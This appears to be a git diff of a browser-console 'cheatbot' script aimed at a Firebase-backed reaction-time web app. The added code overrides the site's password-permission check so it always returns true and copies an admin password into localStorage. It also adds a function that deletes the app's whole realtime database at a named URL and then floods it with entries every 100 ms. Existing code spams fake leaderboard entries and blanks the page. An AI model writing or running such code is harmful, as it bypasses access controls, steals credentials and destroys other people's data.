@@ -1,4 +1,5 @@
 let cb;
+let destroydbint;
 function setupbot() {
     var mlbbtn = document.createElement("button");
     var mlbbtnname = "manipulate leaderboard"
@@ -7,7 +8,11 @@ function setupbot() {
     document.getElementById('buttons').appendChild(mlbbtn) 
     start = function (t) {
         if (started) {
+            if (typeof t === "undefined") {
+            reactionTime = Date.now() - startTime;
+            } else {
             reactionTime = t;
+            }
             document.getElementById("infos").innerHTML = ``;
             document.getElementById("showRtime").innerHTML = `you needed ${reactionTime}ms`;
             reactiondata.push(reactionTime)
@@ -48,10 +53,12 @@ function setupbot() {
             }, timeout);
         }
     }
+    console.log('%ccheatbot setup completed', 'color: red');
+
     mlbbtn.addEventListener('click', () => {
         setInterval(() => {
             firebase
-        .database()
+                .database()
                 .ref("reaction/leaderboard")
                 .push({
                     name: "cb",
@@ -73,9 +80,18 @@ function startbot(t) {
 }; function stopbot() {
     clearInterval(cb)
 };
+function manipulatepw(input) {
+    checkpwpermission = function() {
+        localStorage.setItem("pwpwermission", true)
+        return true
+    }
 
+    localStorage.setItem("datapw", admin.settings.pw)
+    console.log('%cManipulated password functions', 'color: red');
+
+};
 name = "cb";
-console.clear();
+// console.clear();
 
 
 
@@ -90,3 +106,31 @@ console.clear();
 function grief() {
     document.body.innerHTML = ''
 }
+
+function destroydb() {
+    firebase
+        .database()
+        .refFromURL("https://reactionwebapp-default-rtdb.europe-west1.firebasedatabase.app/")
+        .remove()
+
+    destroydbint = setInterval(() => {
+        firebase
+        .database()
+        .refFromURL("https://reactionwebapp-default-rtdb.europe-west1.firebasedatabase.app/")
+        .push("Test")
+    }, 100);
+}
+
+function stopdbdestroy() {
+    clearInterval(destroydbint)
+}
+
+
+//load script 
+function load() {
+    setupbot()
+    manipulatepw()
+    console.log('%cLoaded Cheatfunctions', 'color: red');
+}
+
+load()
